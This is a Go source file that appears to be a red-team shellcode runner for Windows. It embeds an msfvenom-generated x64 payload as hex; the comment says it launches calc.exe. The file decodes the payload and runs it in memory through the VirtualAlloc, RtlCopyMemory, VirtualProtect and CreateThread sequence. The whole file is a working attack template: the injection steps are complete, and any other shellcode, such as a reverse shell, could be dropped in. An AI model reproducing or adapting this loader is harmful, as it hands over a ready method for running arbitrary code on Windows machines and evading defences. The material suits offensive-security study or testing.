package main

import (
	"encoding/hex"
	"fmt"
	"unsafe"

	"github.com/synzack/sys/windows"
)

func main() {
	//msfvenom -a x64 -p windows/x64/exec CMD=calc.exe -f hex
	scHex := "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"

	sc, err := hex.DecodeString(scHex)
	if err != nil {
		fmt.Println("Error in SC")
	}

	//VirtuallAlloc
	memAddr, virtualAllocErr := windows.VirtualAlloc(0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if virtualAllocErr != nil {
		fmt.Println(virtualAllocErr)
	} else {
		fmt.Printf("VirtualAlloc Success: %v", memAddr)
	}

	//RtlCopyMemory
	rtlCopyMemErr := windows.RtlCopyMemory(memAddr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if rtlCopyMemErr != nil {
		fmt.Println(rtlCopyMemErr)
	} else {
		fmt.Println("\nRtlCopyMemory Success")
	}
	//VirtualProtect
	oldProtect := uint32(windows.PAGE_READWRITE)
	virtualProtectErr := windows.VirtualProtect(memAddr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if virtualProtectErr != nil {
		fmt.Println(virtualProtectErr)
	} else {
		fmt.Println("VirtualProtect Success")
	}
	//CreateThread
	var lpThreadID uint32
	thread, createThreadErr := windows.CreateThread(nil, 0, memAddr, uintptr(0), 0, &lpThreadID)
	if createThreadErr != nil {
		fmt.Println(createThreadErr)
	} else {
		fmt.Printf("CreateThread Success: %v", thread)
	}

	//waitForSingleObject
	windows.WaitForSingleObject(thread, 0xFFFFFFFF)
}
